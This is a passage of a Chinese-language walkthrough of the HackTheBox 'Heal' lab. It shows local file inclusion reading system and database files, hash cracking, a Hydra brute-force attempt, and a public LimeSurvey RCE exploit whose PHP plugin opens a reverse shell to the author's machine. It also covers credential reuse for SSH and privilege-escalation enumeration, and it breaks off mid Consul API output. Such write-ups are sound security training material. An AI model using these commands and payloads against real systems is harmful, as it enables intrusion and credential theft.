---
title: 'HackTheBox: Heal'
disqus: hackmd
---

HackTheBox: Heal
===

## Topic

### Lab
- HackTheBox: \
https://app.hackthebox.com/machines/Heal

### Initial Enumeration

● Start Machine: `10.10.11.46`\
![image](https://hackmd.io/_uploads/rkgqSNWkgg.png)

```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -Pn 10.10.11.46
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-19 10:38 EDT
Nmap scan report for 10.10.11.46
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.25 seconds
```
> SSH, HTTP

編輯 `/etc/hosts`
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/hosts                      
10.10.11.46     heal.htb
...
```

瀏覽 http://heal.htb/ \
![image](https://hackmd.io/_uploads/HyTHUV-yll.png)

- fuff
```
┌──(chw㉿CHW)-[~]
└─$  dirb http://heal.htb/
...
---- Scanning URL: http://heal.htb/ ----
+ http://heal.htb/favicon.ico (CODE:200|SIZE:34452)         
+ http://heal.htb/robots.txt (CODE:200|SIZE:67)   
+ http://heal.htb/version (CODE:503|SIZE:608) 
```
> 沒有可用資訊


## Solution
沒有找到明顯可以利用的點：
### 1. 註冊帳號
![image](https://hackmd.io/_uploads/By2H6ZIyxx.png)
> Call API

![image](https://hackmd.io/_uploads/SygKCbLkel.png)
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/hosts
10.10.11.46     heal.htb api.heal.htb
```
成功註冊後：http://heal.htb/resume \
![image](https://hackmd.io/_uploads/HJdvxfUkgl.png)

### 2. `/profile`
![image](https://hackmd.io/_uploads/ByS5gM81xl.png)

### 3. `/survey`
![image](https://hackmd.io/_uploads/Syt3xMI1eg.png)
> `http://take-survey.heal.htb/index.php/552933?lang=en`\
(`take-survey.heal.htb` 加入 `/etc/hosts`)

![image](https://hackmd.io/_uploads/H1SrZfI1xl.png)
> 嘗試 `/552932`、`/552934`: 404
> 1. NEXT
> ![image](https://hackmd.io/_uploads/S1-cNz8Jll.png)
> 2. Finish
> ![image](https://hackmd.io/_uploads/Syu_SMI1ee.png)

#### 3.1 dirb path
```
┌──(chw㉿CHW)-[~/Desktop/HTB]
└─$ dirb http://take-survey.heal.htb/index.php
...
+ http://take-survey.heal.htb/index.php/admin (CODE:302|SIZE:0)                                                                        
+ http://take-survey.heal.htb/index.php/Admin (CODE:302|SIZE:0)                                                                        
+ http://take-survey.heal.htb/index.php/index.php (CODE:200|SIZE:76046)                                                                
+ http://take-survey.heal.htb/index.php/installer (CODE:500|SIZE:4617)                                                                 
+ http://take-survey.heal.htb/index.php/plugins (CODE:302|SIZE:0)                                                                      
+ http://take-survey.heal.htb/index.php/surveys (CODE:200|SIZE:75816)                                                                  
+ http://take-survey.heal.htb/index.php/uploader (CODE:401|SIZE:4569) 
```
- `http://take-survey.heal.htb/index.php/admin`
http://take-survey.heal.htb/index.php/admin/authentication/sa/login \
![image](https://hackmd.io/_uploads/S1lOLXUklg.png)

- `http://take-survey.heal.htb/index.php/plugins`
> login page
- `http://take-survey.heal.htb/index.php/surveys`
![image](https://hackmd.io/_uploads/r1GsIQ8yex.png)
> Administrator: `ralph@heal.htb` 

### 4.  `/resume`
回到 http://heal.htb/resume \
嘗試 XSS ，並 `EXPORT AS PDF`\
![image](https://hackmd.io/_uploads/HJVBLGIkxe.png)
![image](https://hackmd.io/_uploads/H1j8IzLJgx.png)
> 🧠 POST PHP (Reverse Shell) 

![image](https://hackmd.io/_uploads/rkqYLMLyle.png)
> 🧠 LFI
 
![image](https://hackmd.io/_uploads/ryUuLzIygg.png)

### 2. POST `/exports`
嘗試從 POST `/exports` 注入 php
- 嘗試修改 `"format":"php"` : 500
![image](https://hackmd.io/_uploads/r1ys_MIJex.png)
- 嘗試修改 Body: 不會觸發 Body script
![image](https://hackmd.io/_uploads/BJn7FGLylx.png)
> 無效
### 3. LFI
- /etc/passwd
![image](https://hackmd.io/_uploads/r19UGQ81el.png)
> User: `ralph`, `ron`\
> PostgreSQL

- `/etc/shadow`: 404
- `/home/ralph/.ssh/id_rsa`: 404
- `/home/ron/.ssh/id_rsa`: 404

#### 3.1 嘗試 [PostgreSQL Path](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL)
- `/var/lib/postgresql/.psql_history`: 404
- `/var/lib/postgresql/copy_output`: 404
- 不知道 Postgresql 版本： 盲猜
    - `/etc/postgresql/13/main/postgresql.conf`: 404
    - `/etc/postgresql/14/main/postgresql.conf`: !!!
    - ![image](https://hackmd.io/_uploads/BycLqu8Jex.png)\
    (通靈成功)\
    ![image](https://hackmd.io/_uploads/By5a9dLkex.png)
    > 得知：
    > 1. postgresql version: `14`
    > 2. `/etc/postgresql/14/main/pg_hba.conf`: 404
    > 3. `/etc/postgresql/14/main/pg_ident.conf`:404
    > 4.  PID: `/var/run/postgresql/14-main.pid`: 200 {1404}

#### 3.2 PID
在 `/var/run/postgresql/14-main.pid` 中得知 PID: `1404`
- `/proc/1404/status`: 200 空白
- `/proc/1404/cmdline`: 200 空白
- `/proc/1404/environ`: 404

> 通靈無效

### 4. Hydra 爆破 login page
`http://take-survey.heal.htb/index.php/admin/authentication/sa/login`
![image](https://hackmd.io/_uploads/HJgyYQ8yxg.png)
```
┌──(chw㉿CHW)-[~]
└─$ cat Heal_user.txt 
ralph
ron
      
┌──(chw㉿CHW)-[~]
└─$ hydra -L Heal_user.txt -P /usr/share/wordlists/rockyou.txt \ 
    take-survey.heal.htb http-post-form \ 
    "/index.php/admin/authentication/sa/login:YII_CSRF_TOKEN=V0gzVG5mSU9kZElNbXhiXzQ4OGVwTmltdWRpMXVJZn6XdH76c8DC_3d73dsrK7FJaIT79sqvbJbjMgoxCLL4yw%3D%3D&authMethod=Authdb&user=^USER^&password=^PASS^&loginlang=default&action=login&width=1512&login_submit=login:Invalid username or password" \
    -F -t 4 -w 10
...
[80][http-post-form] host: take-survey.heal.htb   login: ralph   password: 123456
...
```
> ~~`ralph`~~: ~~`123456`~~\
> ![image](https://hackmd.io/_uploads/SJmw5XI1gg.png)
> > 是觸發 maximum login attempts \
> > 猜測：不是用爆破

🚫🚫🚫 卡關 🚫🚫🚫\
我參考了別人的 Writeup:
http://api.heal.htb/\
![image](https://hackmd.io/_uploads/SkB_GnIkll.png)
> 在 API 中是使用 Ruby on Rails App\
> 💭 原本不認爲是解題關鍵，但竟是 LFI 路徑的關鍵

### 5. Ruby on Rails App
在 [RailsGuides](https://guides.rubyonrails.org/v2.3/getting_started.html) 與 [Error starting Rails server](https://gorails.com/forum/help-please-error-starting-rails-server) 中，測試 LFI Rails 路徑：\
![image](https://hackmd.io/_uploads/SJnsB2Ikle.png)

- `config.ru`
![image](https://hackmd.io/_uploads/HJ0zr28Jgx.png)
- `/config/database.yml`
![image](https://hackmd.io/_uploads/ByC0rhL1ll.png)
> 1. SQLite. Versions 3.8.0
> 2. database: `storage/development.sqlite3`
- `/storage/development.sqlite`
![image](https://hackmd.io/_uploads/B1WlPnU1gl.png)
> 成功撈到資料庫

### 6. Sqlite3
```
┌──(chw㉿CHW)-[~/Downloads]
└─$ sqlite3 development.sqlite3                                                                                
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
ar_internal_metadata  token_blacklists    
schema_migrations     users 

sqlite> .schema users 
CREATE TABLE IF NOT EXISTS "users" ("id" integer PRIMARY KEY AUTOINCREMENT NOT NULL, "email" varchar, "password_digest" varchar, "created_at" datetime(6) NOT NULL, "updated_at" datetime(6) NOT NULL, "fullname" varchar, "username" varchar, "is_admin" boolean);

sqlite> SELECT * FROM users; 
1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
2|chw@gmail.com|$2a$12$ot8ihGHYNN5YZ8xbXYmURu2CuT/xFzE5sj3XMNd3a6c3Wzze7fSsq|2025-04-23 14:03:58.107813|2025-04-23 14:03:58.107813|chw|chw|0
3|caio@gmail.com|$2a$12$3RxoxFydCnQhUxRPDbVrcexKkABy2vKoQ8gUTf27At7AGIkwmRD8u|2025-04-23 14:20:36.922547|2025-04-23 14:20:36.922547|caio sempronio|caio123|0
4|caio1@gmail.com|$2a$12$RSJjEaFUqb56.mZjnmf/TeWMu5amTkx7I2C56OnviAWaDMw1gd8.m|2025-04-23 14:22:56.023355|2025-04-23 14:22:56.023355|caio sempronio|caio1234|0
5|wewe@gmail.com|$2a$12$4b7VyHnCDEanIgBOBjv2Qe0iqOnuB2eP0Hm/7bnYgXvEuJMdNQ5zq|2025-04-23 14:31:34.859581|2025-04-23 14:31:34.859581|wewe|admin' OR 1=1 --|0
6|admin123@gmail.com|$2a$12$wdeOK841DvUfDsULH2jH.OsFk/xSTvHX1XPgTUKohuSzhtSg.320K|2025-04-23 14:33:21.025702|2025-04-23 14:33:21.025702|admin' OR 1=1; --|admin|0
7|' OR 1=1; --|$2a$12$CoXLO6yqEzm1LmclfK4lq..p380Y/0Po.qWejJSL9iXTyzRZ6h0U6|2025-04-23 14:34:15.831390|2025-04-23 14:34:15.831390|admin1234|admin1234|0
8|adsfsweg@gmail.com|$2a$12$E5/p0.VJo4MQTYOCXkdRm.AsRKdnhRCt/5pinONAeyzDf/gFOPX8G|2025-04-23 14:35:16.807065|2025-04-23 14:35:16.807065|admin12345|admin12345|0
9|a@a|$2a$12$26eSodcHyoEsUKY4dFvlveoA0f41MebVzdhXjdHzBwuUxeNWXBI3C|2025-04-23 17:31:20.127236|2025-04-23 17:31:20.127236|a|a|0

sqlite> 
```
只需要提取 ralph 的 bcrypt (其餘是靶機上其他人創建的 user)
```
┌──(chw㉿CHW)-[~/Downloads]
└─$ cat Heal.hash   
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG

┌──(chw㉿CHW)-[~/Downloads]
└─$ nth -f Heal.hash
...
Most Likely 
bcrypt, HC: 3200 JtR: bcrypt
Blowfish(OpenBSD), HC: 3200 JtR: bcrypt Summary: Can be used in Linux Shadow Files.
Woltlab Burning Board 4.x,
```
### 7. Hashcat
```
┌──(chw㉿CHW)-[~/Downloads]
└─$ hashcat -m 3200 Heal.hash /usr/share/wordlists/rockyou.txt --show 
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
```
> `ralph@heal.htb`:`147258369`

### 8. LimeSurvey
SSH 無法登入，嘗試登入 Limeurvey
![image](https://hackmd.io/_uploads/r1oD6hUJeg.png)
> LimeSurvey Community Edition Version 6.6.4

Searchsploit 皆不適用\
![image](https://hackmd.io/_uploads/S1Udy6Iygl.png)
在 Github 中找到 [Limesurvey-6.6.4-RCE](https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE):\
編輯 revshell.php
```
┌──(chw㉿CHW)-[~/Downloads]
└─$ git clone https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE.git       

┌──(chw㉿CHW)-[~/Downloads]
└─$ cd Limesurvey-6.6.4-RCE 

┌──(chw㉿CHW)-[~/Downloads/Limesurvey-6.6.4-RCE]
└─$ cat revshell.php       
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '{Kali IP}';  // CHANGE THIS
$port = 8888;       // CHANGE THIS
...                                                       
       
┌──(chw㉿CHW)-[~/Downloads/Limesurvey-6.6.4-RCE]
└─$ zip -r N4s1rl1.zip config.xml revshell.php
updating: config.xml (deflated 59%)
updating: revshell.php (deflated 68%)

┌──(chw㉿CHW)-[~/Downloads/Limesurvey-6.6.4-RCE]
└─$ pip install -r requirements.txt --break-system-packages

┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
```
執行 exploit
```
──(chw㉿CHW)-[~/Downloads/Limesurvey-6.6.4-RCE]
└─$ python exploit.py http://take-survey.heal.htb/ ralph@heal.htb 147258369 80
 _   _ _  _  ____  _ ____  _     _ 
| \ | | || |/ ___|/ |  _ \| |   / |                                                                                                     
|  \| | || |\___ \| | |_) | |   | |                                                                                                     
| |\  |__   _|__) | |  _ <| |___| |                                                                                                     
|_| \_|  |_||____/|_|_| \_\_____|_|                         

[INFO] Retrieving CSRF token for login...
[SUCCESS] CSRF Token Retrieved: VkhTOVVpZktCcHpwaFpTNDJ4d3JGWW9WWWUyX1JWSkZR_oLqAk_UyIn6PSDEe8I83hftKhpVArrJ1DRE1yl8pA==

[INFO] Sending Login Request...                                                                                                         
[SUCCESS] Login Successful!

[INFO] Uploading Plugin...                                                                                                              
[SUCCESS] Plugin Uploaded Successfully!

[INFO] Installing Plugin...                                                                                                             
[SUCCESS] Plugin Installed Successfully!

[INFO] Activating Plugin...                                                                                                             
[SUCCESS] Plugin Activated Successfully!

[INFO] Triggering Reverse Shell...
```
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...

connect to [10.10.14.76] from (UNKNOWN) [10.10.11.46] 56248
Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 19:41:24 up  9:37,  0 users,  load average: 1.00, 0.52, 0.32
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ hostname
heal
$ cd home
$ ls
ralph
ron

```
> `www-data`\
> 🧠 尋找 `ralph` 或 `ron` SSH password

先查看 LFI 失敗的路徑： limesurvey config\
`cat /var/www/limesurvey/application/config/config.php`
```php
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|    'connectionString' Hostname, database, port and database type for 
|     the connection. Driver example: mysql. Currently supported:
|                 mysql, pgsql, mssql, sqlite, oci
|    'username' The username used to connect to the database
|    'password' The password used to connect to the database
|    'tablePrefix' You can add an optional prefix, which will be added
|                 to the table name when using the Active Record class
|
*/
return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$$w0rd',
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),

                 'session' => array (
                        'sessionName'=>'LS-ZNIDJBOXUNKXWTIP',
                        // Uncomment the following lines if you need table-based sessions.
                        // Note: Table-based sessions are currently not supported on MSSQL server.
                        // 'class' => 'application.core.web.DbHttpSession',
                        // 'connectionID' => 'db',
                        // 'sessionTableName' => '{{sessions}}',
                 ),

                'urlManager' => array(
                        'urlFormat' => 'path',
                        'rules' => array(
                                // You can add your own rules here
                        ),
                        'showScriptName' => true,
                ),

                // If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
                //'request' => array(
                //      'baseUrl' => '/limesurvey',
                //),
        ),
        // For security issue : it's better to set runtimePath out of web access
        // Directory must be readable and writable by the webuser
        // 'runtimePath'=>'/var/limesurvey/runtime/'
        // Use the following config variable to set modified optional settings copied from config-defaults.php
        'config'=>array(
        // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
        // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
        // on your webspace.
        // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
                'debug'=>0,
                'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2

                // If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
                // public URL (the URL facing survey participants). You will also need to set the request->baseUrl in the section above.
                //'publicurl' => 'https://www.example.org/limesurvey',

                // Update default LimeSurvey config here
        )
);
/* End of file config.php */
/* Location: ./application/config/config.php */
```
> `db_user`:`AdmiDi0_pA$$w0rd`

先嘗試 SSH Login
```
┌──(chw㉿CHW)-[~]
└─$ ssh ralph@10.10.11.46     
ralph@10.10.11.46's password: 
Permission denied, please try again.
ralph@10.10.11.46's password: 

┌──(chw㉿CHW)-[~]
└─$ ssh ron@10.10.11.46
ron@10.10.11.46's password:
ron@heal:~$ id
uid=1001(ron) gid=1001(ron) groups=1001(ron)
ron@heal:~$ hostname
heal
```
> `ron`:`AdmiDi0_pA$$w0rd` 成功登入🌄

### ✅ Get User Flag
> 在 `/home/ron` 找到 User flag

## Privileges Escalation

### 9. Sudo -l
```
ron@heal:~$ sudo -l
[sudo] password for ron: 
Sorry, user ron may not run sudo on heal.
```
> 沒有 sudo 權限

### 10. Writable File
```
ron@heal:~$ find / -writable -type d 2>/dev/null
/var/crash
/var/lib/php/sessions
/var/tmp
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/generator.late
/run/user/1001/systemd/generator.late/xdg-desktop-autostart.target.wants
/run/user/1001/systemd/units
/run/user/1001/systemd/inaccessible
/run/screen
/run/lock
/home/ron
/home/ron/.ssh
/home/ron/.cache
/dev/mqueue
/dev/shm
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.font-unix
/tmp/.XIM-unix
/proc/58865/task/58865/fd
/proc/58865/fd
/proc/58865/map_files
```
> 沒有明顯可利用的檔案
### 11. SUID
```
ron@heal:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/fusermount3
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
```
> 查看版本
```
ron@heal:~$ /usr/bin/fusermount3 --version
fusermount3 version: 3.10.5
ron@heal:~$ dpkg -l | grep polkit
ii  libpolkit-agent-1-0:amd64              0.105-33                                amd64        PolicyKit Authentication Agent API
ii  libpolkit-gobject-1-0:amd64            0.105-33                                amd64        PolicyKit Authorization API
ii  pkexec                                 0.105-33                                amd64        run commands as another user with polkit authorization
ii  policykit-1                            0.105-33                                amd64        transitional package for polkitd and pkexec
ii  polkitd                                0.105-33                                amd64        framework for managing administrative policies and privileges
ron@heal:/tmp/CVE-2021-4034$ ls -l /usr/bin/pkexec
-rwxr-xr-x 1 root root 30872 Feb 26  2022 /usr/bin/pkexec
```
> `policykit-1 / pkexec / polkitd: 0.105-33`，但 `/usr/bin/pkexec` 沒有權限，不成立 CVE-2021-4034
>> 無解
### 12. linPEAS
(Kali)
```
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ scp ./linpeas.sh  ron@10.10.11.46:/home/ron

ron@10.10.11.46's password: 
linpeas.sh 
```
(SSH)
```
ron@heal:~$ ./linpeas.sh 
...
```
#### 12.1 CVE
```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                      
[+] [CVE-2022-0847] DirtyPipe                               

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

```
> 大略嘗試都無法成功執行

#### 12.2 Ports
![image](https://hackmd.io/_uploads/ryxjuA8yxl.png)

>[!Important]
> - `8500 / 8503 / 8600 / 8300–8302`\
HashiCorp Consul 預設 port，常見於內網服務註冊/配置系統	
> - `3000 / 3001`\
> 常見於 Node.js / Grafana 
>- `5432`\
>PostgreSQL

1. Consul
```
ron@heal:~$ curl http://127.0.0.1:8500/v1/agent/self
{"Config":{"Datacenter":"server1","PrimaryDatacenter":"heal-server","NodeName":"consul-01","NodeID":"d22af051-af4e-badd-2266-a9a06ec051ed","Revision":"048f1936","Server":true,"Version":"1.19.2","BuildDate":"2024-08-27T16:06:44Z"},"DebugConfig":{"ACLEnableKeyListPolicy":false,"ACLInitialManagementToken":"hidden","ACLResolverSettings":{"ACLDefaultPolicy":"allow","ACLDownPolicy":"extend-cache","ACLPolicyTTL":"30s","ACLRoleTTL":"0s","ACLTokenTTL":"30s","ACLsEnabled":true,"Datacenter":"server1","EnterpriseMeta":{},"NodeName":"consul-01"},"ACLTokenReplication":false,"ACLTokens":{"ACLAgentRecoveryToken":"hidden","ACLAgentToken":"hidden","ACLConfigFileRegistrationToken":"hidden","ACLDNSToken":"hidden","ACLDefaultToken":"hidden","ACLReplicationToken":"hidden","DataDir":"/var/lib/consul","EnablePersistence":false,"EnterpriseConfig":{}},"ACLsEnabled":true,"AEInterval":"1m0s","AdvertiseAddrLAN":"127.0.0.1","AdvertiseAddrWAN":"127.0.0.1","AdvertiseReconnectTimeout":"0s","AllowWriteHTTPFrom":[],"AutoConfig":{"Authorizer":{"AllowReuse":false,"AuthMethod":{"ACLAuthMethodEnterpriseFields":{},"Config":{"BoundAudiences":null,"BoundIssuer":"","ClaimMappings":null,"ClockSkewLeeway":0,"ExpirationLeeway":0,"JWKSCACert":"","JWKSURL":"","JWTSupportedAlgs":null,"JWTValidationPubKeys":null,"ListClaimMappings":null,"NotBeforeLeeway":0,"OIDCDiscoveryCACert":"","OIDCDiscoveryURL":""},"Description":"","DisplayName":"","EnterpriseMeta":{},"MaxTokenTTL":"0s","Name":"Auto Config Authorizer","RaftIndex":{"CreateIndex":0,"ModifyIndex":0},"TokenLocality":"","Type":"jwt"},"ClaimAssertions":[],"Enabled":false},"DNSSANs":[],"Enabled":false,"IPSANs":[],"IntroToken":"hidden","IntroTokenFile":"","ServerAddresses":[]},"AutoEncryptAllowTLS":false,"AutoEncryptDNSSAN":[],"AutoEncryptIPSAN":[],"AutoEncryptTLS":false,"AutoReloadConfig":false,"AutoReloadConfigCoalesceInterval":"1s","AutopilotCleanupDeadServers":true,"AutopilotDisableUpgradeMigration":false,"AutopilotLastContactThreshold":"200ms","AutopilotMaxTrailingLogs":250,"AutopilotMinQuorum":0,"AutopilotRedundancyZoneTag":"","AutopilotServerStabilizationTime":"10s","AutopilotUpgradeVersionTag":"","BindAddr":"127.0.0.1","Bootstrap":true,"BootstrapExpect":0,"BuildDate":"2024-08-27 16:06:44 +0000 UTC","Cache":{"EntryFetchMaxBurst":2,"EntryFetchRate":1.7976931348623157e+308,"Logger":null},"CheckDeregisterIntervalMin":"1m0s","CheckOutputMaxSize":4096,"CheckReapInterval":"30s","CheckUpdateInterval":"5m0s","Checks":[],"ClientAddrs":["127.0.0.1"],"Cloud":{"AuthURL":"","ClientID":"","ClientSecret":"hidden","Hostname":"","ManagementToken":"hidden","NodeID":"","NodeName":"consul-01","ResourceID":"","ScadaAddress":"","TLSConfig":null},"ConfigEntryBootstrap":[],"ConnectCAConfig":{},"ConnectCAProvider":"","ConnectEnabled":true,"ConnectMeshGatewayWANFederationEnabled":false,"ConnectSidecarMaxPort":21255,"ConnectSidecarMinPort":21000,"ConnectTestCALeafRootChangeSpread":"0s","ConsulCoordinateUpdateBatchSize":128,"ConsulCoordinateUpdateMaxBatches":5,"ConsulCoordinateUpdatePeriod":"5s","ConsulRaftElectionTimeout":"5s","ConsulRaftHeartbeatTimeout":"5s","ConsulRaftLeaderLeaseTimeout":"2.5s","ConsulServerHealthInterval":"2s","DNSARecordLimit":0,"DNSAddrs":["tcp://127.0.0.1:8600","udp://127.0.0.1:8600"],"DNSAllowStale":true,"DNSAltDomain":"","DNSCacheMaxAge":"0s","DNSDisableCompression":false,"DNSDomain":"consul.","DNSEnableTruncate":false,"DNSMaxStale":"87600h0m0s","DNSNodeMetaTXT":true,"DNSNodeTTL":"0s","DNSOnlyPassing":false,"DNSPort":8600,"DNSRecursorStrategy":"sequential","DNSRecursorTimeout":"2s","DNSRecursors":[],"DNSSOA":{"Expire":86400,"Minttl":0,"Refresh":3600,"Retry":600},"DNSServiceTTL":{},"DNSUDPAnswerLimit":3,"DNSUseCache":false,"DataDir":"/var/lib/consul","Datacenter":"server1","DefaultIntentionPolicy":"","DefaultQueryTime":"5m0s","DevMode":false,"DisableAnonymousSignature":false,"DisableCoordinates":false,"DisableHTTPUnprintableCharFilter":false,"DisableHostNodeID":true,"DisableKeyringFile":false,"DisableRemoteExec":true,"DisableUpdateCheck":false,"DiscardCheckOutput":false,"DiscoveryMaxStale":"0s","EnableAgentTLSForChecks":false,"EnableCentralServiceConfig":true,"EnableDebug":false,"EnableLocalScriptChecks":true,"EnableRemoteScriptChecks":true,"EncryptKey":"hidden","EnterpriseRuntimeConfig":{},"Experiments":[],"ExposeMaxPort":21755,"ExposeMinPort":21500,"GRPCAddrs":[],"GRPCKeepaliveInterval":"30s","GRPCKeepaliveTimeout":"20s","GRPCPort":-1,"GRPCTLSAddrs":["tcp://127.0.0.1:8503"],"GRPCTLSPort":8503,"GossipLANGossipInterval":"200ms","GossipLANGossipNodes":3,"GossipLANProbeInterval":"1s","GossipLANProbeTimeout":"500ms","GossipLANRetransmitMult":4,"GossipLANSuspicionMult":4,"GossipWANGossipInterval":"500ms","GossipWANGossipNodes":3,"GossipWANProbeInterval":"5s","GossipWANProbeTimeout":"3s","GossipWANRetransmitMult":4,"GossipWANSuspicionMult":6,"HTTPAddrs":["tcp://127.0.0.1:8500"],"HTTPBlockEndpoints":[],"HTTPMaxConnsPerClient":200,"HTTPMaxHeaderBytes":0,"HTTPPort":8500,"HTTPResponseHeaders":{},"HTTPSAddrs":[],"HTTPSHandshakeTimeout":"5s","HTTPSPort":-1,"HTTPUseCache":true,"KVMaxValueSize":524288,"LeaveDrainTime":"5s","LeaveOnTerm":false,"LocalProxyConfigResyncInterval":"30s","Locality":null,"Logging":{"EnableSyslog":true,"LogFilePath":"","LogJSON":false,"LogLevel":"DEBUG","LogRotateBytes":0,"LogRotateDuration":"0s","LogRotateMaxFiles":0,"Name":"","SyslogFacility":"LOCAL0"},"MaxQueryTime":"10m0s","NodeID":"d22af051-af4e-badd-2266-a9a06ec051ed","NodeMeta":{},"NodeName":"consul-01","PeeringEnabled":true,"PeeringTestAllowPeerRegistrations":false,"PidFile":"","PrimaryDatacenter":"heal-server","PrimaryGateways":[],"PrimaryGatewaysInterval":"30s","RPCAdvertiseAddr":"tcp://127.0.0.1:8300","RPCBindAddr":"tcp://127.0.0.1:8300","RPCClientTimeout":"1m0s","RPCConfig":{"EnableStreaming":true},"RPCHandshakeTimeout":"5s","RPCHoldTimeout":"7s","RPCMaxBurst":1000,"RPCMaxConnsPerClient":100,"RPCProtocol":2,"RPCRateLimit":1.7976931348623157e+308,"RaftLogStoreConfig":{"Backend":"default","BoltDB":{"NoFreelistSync":false},"DisableLogCache":false,"Verification":{"Enabled":false,"Interval":"0s"},"WAL":{"SegmentSize":67108864}},"RaftProtocol":3,"RaftSnapshotInterval":"30s","RaftSnapshotThreshold":16384,"RaftTrailingLogs":1